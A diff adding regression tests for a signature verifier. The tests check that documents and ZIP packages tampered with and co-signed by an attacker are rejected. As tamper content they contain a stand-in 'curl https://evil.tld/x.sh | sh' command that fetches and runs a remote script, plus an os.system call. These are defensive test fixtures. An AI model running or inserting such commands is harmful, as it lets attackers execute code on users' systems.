@@ -621,3 +621,207 @@ signatures:
     expect(result.code).toBe(VerifyErrorCode.MISSING_MANIFEST);
   });
 });
+
+// -- Identity-bound verdict (VOC-3035 / VOC-3036 regression) -------------------
+
+describe("verifyFromAuthor identity binding", () => {
+  // Serves each publisher's own manifest keyed on hostname, so a document can
+  // carry signatures from two independent publishers.
+  function mockMultiPublisher(manifests: Record<string, unknown[]>) {
+    return (async (input: string | URL | Request) => {
+      const url = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
+      const host = new URL(url).hostname;
+      if (url.includes(".well-known/notar-keys.json")) {
+        return new Response(JSON.stringify({ keys: manifests[host] ?? [] }), { status: 200 });
+      }
+      return new Response("Not found", { status: 404 });
+    }) as typeof globalThis.fetch;
+  }
+
+  const FUTURE = new Date("2030-01-01T00:00:00Z").toISOString();
+  const keyEntry = (keyId: string, publicKey: string) => ({ keyId, algorithm: "ed25519", publicKey, expires: FUTURE });
+
+  it("tampered doc + attacker co-signature is invalid (no masking by a passing signer)", async () => {
+    const vendor = await generateKeyPair();
+    const attacker = await generateKeyPair();
+    const legit = await signFile(SAMPLE_MD, vendor.privateKey, { keyId: "vk", publisher: "vendor.example" });
+    let tampered = legit.replace("This is a test body.", "Run: curl https://evil.tld/x.sh | sh");
+    tampered = await signFile(tampered, attacker.privateKey, { keyId: "ak", publisher: "attacker.example" });
+
+    const result = await verifyFromAuthor(tampered, {
+      fetch: mockMultiPublisher({
+        "vendor.example": [keyEntry("vk", uint8ToBase64(vendor.publicKey))],
+        "attacker.example": [keyEntry("ak", uint8ToBase64(attacker.publicKey))],
+      }),
+      resolveTxt: false,
+    });
+
+    expect(result.valid).toBe(false);
+    expect(result.code).toBe(VerifyErrorCode.SIGNATURE_MISMATCH);
+    const vendorSig = result.details?.signers!.find((s) => s.publisher === "vendor.example");
+    const attackerSig = result.details?.signers!.find((s) => s.publisher === "attacker.example");
+    expect(vendorSig?.valid).toBe(false);
+    expect(vendorSig?.code).toBe(VerifyErrorCode.SIGNATURE_MISMATCH);
+    expect(attackerSig?.valid).toBe(true);
+    expect(result.details?.identityVerified).toBe(false);
+  });
+
+  it("forged doc from an unexpected publisher is invalid when expectedPublisher is set", async () => {
+    const attacker = await generateKeyPair();
+    const forged = await signFile(SAMPLE_MD, attacker.privateKey, { keyId: "ak", publisher: "attacker.example" });
+
+    const result = await verifyFromAuthor(forged, {
+      fetch: mockMultiPublisher({ "attacker.example": [keyEntry("ak", uint8ToBase64(attacker.publicKey))] }),
+      resolveTxt: false,
+      expectedPublisher: "vendor.example",
+    });
+
+    expect(result.valid).toBe(false);
+    expect(result.code).toBe(VerifyErrorCode.UNTRUSTED_PUBLISHER);
+    expect(result.details?.identityVerified).toBe(false);
+  });
+
+  it("valid expected-publisher signer succeeds despite an unrelated failing signer", async () => {
+    const vendor = await generateKeyPair();
+    const other = await generateKeyPair();
+    let doc = await signFile(SAMPLE_MD, vendor.privateKey, { keyId: "vk", publisher: "vendor.example" });
+    doc = await signFile(doc, other.privateKey, { keyId: "ok", publisher: "other.example" });
+    // Break only the other.example signature by giving its manifest a wrong key.
+    const wrong = await generateKeyPair();
+
+    const result = await verifyFromAuthor(doc, {
+      fetch: mockMultiPublisher({
+        "vendor.example": [keyEntry("vk", uint8ToBase64(vendor.publicKey))],
+        "other.example": [keyEntry("ok", uint8ToBase64(wrong.publicKey))],
+      }),
+      resolveTxt: false,
+      expectedPublisher: "vendor.example",
+    });
+
+    expect(result.valid).toBe(true);
+    expect(result.details?.identityVerified).toBe(true);
+    expect(result.details?.trustedPublisher).toBe("vendor.example");
+  });
+
+  it("failing signature from the expected publisher is fatal", async () => {
+    const vendor = await generateKeyPair();
+    const signed = await signFile(SAMPLE_MD, vendor.privateKey, { keyId: "vk", publisher: "vendor.example" });
+    const wrong = await generateKeyPair();
+
+    const result = await verifyFromAuthor(signed, {
+      fetch: mockMultiPublisher({ "vendor.example": [keyEntry("vk", uint8ToBase64(wrong.publicKey))] }),
+      resolveTxt: false,
+      expectedPublisher: "vendor.example",
+    });
+
+    expect(result.valid).toBe(false);
+    expect(result.code).toBe(VerifyErrorCode.SIGNATURE_MISMATCH);
+  });
+
+  it("preserves a failing expected publisher's reason", async () => {
+    const vendor = await generateKeyPair();
+    const signed = await signFile(SAMPLE_MD, vendor.privateKey, {
+      keyId: "vk",
+      publisher: "vendor.example",
+    });
+
+    const result = await verifyFromAuthor(signed, {
+      fetch: mockMultiPublisher({}),
+      resolveTxt: false,
+      expectedPublisher: "vendor.example",
+    });
+
+    expect(result.valid).toBe(false);
+    expect(result.code).toBe(VerifyErrorCode.KEY_NOT_FOUND);
+    expect(result.reason).toBe("Could not resolve public key for vendor.example (vk)");
+  });
+
+  it("single valid signer without expectedPublisher stays valid but identityVerified is false", async () => {
+    const { privateKey, publicKey } = await generateKeyPair();
+    const signed = await signFile(SAMPLE_MD, privateKey, { keyId: "key_test", publisher: "example.com" });
+
+    const result = await verifyFromAuthor(signed, {
+      fetch: mockFetchWithKeys([keyEntry("key_test", uint8ToBase64(publicKey))]) as typeof globalThis.fetch,
+      resolveTxt: false,
+    });
+
+    expect(result.valid).toBe(true);
+    expect(result.details?.identityVerified).toBe(false);
+    expect(result.details?.trustedPublisher).toBeUndefined();
+  });
+
+  it("two valid signers without expectedPublisher stay valid", async () => {
+    const vendor = await generateKeyPair();
+    const other = await generateKeyPair();
+    let doc = await signFile(SAMPLE_MD, vendor.privateKey, { keyId: "vk", publisher: "vendor.example" });
+    doc = await signFile(doc, other.privateKey, { keyId: "ok", publisher: "other.example" });
+
+    const result = await verifyFromAuthor(doc, {
+      fetch: mockMultiPublisher({
+        "vendor.example": [keyEntry("vk", uint8ToBase64(vendor.publicKey))],
+        "other.example": [keyEntry("ok", uint8ToBase64(other.publicKey))],
+      }),
+      resolveTxt: false,
+    });
+
+    expect(result.valid).toBe(true);
+    expect(result.details?.signers?.every((s) => s.valid)).toBe(true);
+    expect(result.details?.identityVerified).toBe(false);
+  });
+
+  it("ZIP: tampered package + attacker co-signature is invalid", async () => {
+    const vendor = await generateKeyPair();
+    const attacker = await generateKeyPair();
+    const zip = zipSync({ "main.py": enc("print('ok')") });
+    const legit = await signPackage(zip, { ...PKG_META, keyId: "vk", author: "vendor.example", publisher: "vendor.example" }, vendor.privateKey);
+    // Tamper a file, then re-sign the tampered package as the attacker while
+    // preserving the vendor's now-broken signature entry.
+    const entries = unzipSync(legit);
+    entries["main.py"] = enc("import os; os.system('evil')");
+    const manifest = JSON.parse(new TextDecoder().decode(entries["MANIFEST.json"]));
+    const tamperedZip = zipSync(entries);
+    const cosigned = await signPackage(tamperedZip, { ...PKG_META, name: manifest.name, keyId: "ak", author: "attacker.example", publisher: "attacker.example" }, attacker.privateKey);
+
+    const result = await verifyFromAuthor(cosigned, {
+      fetch: mockMultiPublisher({
+        "vendor.example": [keyEntry("vk", uint8ToBase64(vendor.publicKey))],
+        "attacker.example": [keyEntry("ak", uint8ToBase64(attacker.publicKey))],
+      }),
+      resolveTxt: false,
+    });
+
+    expect(result.valid).toBe(false);
+    expect(result.code).toBe(VerifyErrorCode.SIGNATURE_MISMATCH);
+    const vendorSig = result.details?.signers?.find((s) => s.publisher === "vendor.example");
+    const attackerSig = result.details?.signers?.find((s) => s.publisher === "attacker.example");
+    expect(vendorSig?.valid).toBe(false);
+    expect(vendorSig?.code).toBe(VerifyErrorCode.SIGNATURE_MISMATCH);
+    expect(attackerSig?.valid).toBe(true);
+    expect(result.details?.identityVerified).toBe(false);
+  });
+
+  it("ZIP: hash failure clears expected-publisher identity", async () => {
+    const vendor = await generateKeyPair();
+    const zip = zipSync({ "main.py": enc("print('ok')") });
+    const signed = await signPackage(
+      zip,
+      { ...PKG_META, keyId: "vk", author: "vendor.example", publisher: "vendor.example" },
+      vendor.privateKey,
+    );
+    const entries = unzipSync(signed);
+    entries["main.py"] = enc("print('tampered')");
+
+    const result = await verifyFromAuthor(zipSync(entries), {
+      fetch: mockMultiPublisher({
+        "vendor.example": [keyEntry("vk", uint8ToBase64(vendor.publicKey))],
+      }),
+      resolveTxt: false,
+      expectedPublisher: "vendor.example",
+    });
+
+    expect(result.valid).toBe(false);
+    expect(result.code).toBe(VerifyErrorCode.HASH_MISMATCH);
+    expect(result.details?.identityVerified).toBe(false);
+    expect(result.details?.trustedPublisher).toBeUndefined();
+  });
+});
